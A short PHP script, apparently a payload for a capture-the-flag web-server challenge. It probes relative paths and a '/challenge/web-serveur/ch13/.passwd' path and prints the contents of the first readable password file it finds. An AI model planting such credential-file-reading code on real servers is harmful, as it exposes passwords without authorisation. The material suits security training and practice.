<?php
$paths = [
    '.passwd',
    '../.passwd',
    '../../.passwd',
    '/challenge/web-serveur/ch13/.passwd'
];

echo "<pre>\n";
foreach ($paths as $path) {
    if (file_exists($path) && is_readable($path)) {
        echo "Found in [{$path}]:\n";
        echo htmlspecialchars(file_get_contents($path)) . "\n";
        break;
    }
}
echo "</pre>";
?>
